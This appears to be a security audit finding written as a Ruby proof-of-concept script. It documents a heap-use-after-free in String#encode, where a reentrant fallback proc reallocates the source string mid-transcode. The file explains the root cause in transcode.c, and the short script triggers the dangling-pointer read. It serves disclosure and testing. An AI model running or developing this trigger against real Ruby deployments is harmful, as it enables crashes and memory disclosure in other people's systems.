# FINDING-006 — heap-use-after-free in String#encode via reentrant :fallback.
#
# str_transcode0 (transcode.c) caches the SOURCE pointer:
#     fromp = sp = RSTRING_PTR(str); slen = RSTRING_LEN(str);
#     transcode_loop(&fromp, &bp, sp+slen, ...);
# For an undefined conversion, transcode_loop invokes the user :fallback
# (proc/Hash/method/[]-able) at transcode.c:2433. The fallback here reallocates
# the source string (the live receiver), freeing the buffer `fromp`/`sp+slen`
# point at. transcode_loop then `goto resume` -> rb_econv_convert reads the
# dangling input pointer at transcode.c:592 (transcode_restartable0:
# `next_byte = (unsigned char)*in_p++;`) => heap-use-after-free READ.
#
# No re-fetch / str_mod_check guards the source across the fallback boundary
# (unlike gsub/scan `str_mod_check` or pack's "format string modified" check).

s = "あ" * 4000                       # 4000 Hiragana = 12000 bytes UTF-8 (heap)
s.encode("US-ASCII",                       # every char is an undefined conversion
         fallback: proc { |c|
           s.replace("Z" * (16 * 1024 * 1024))  # realloc/free the source mid-transcode
           "?"
         })
STDERR.puts "NO CRASH"
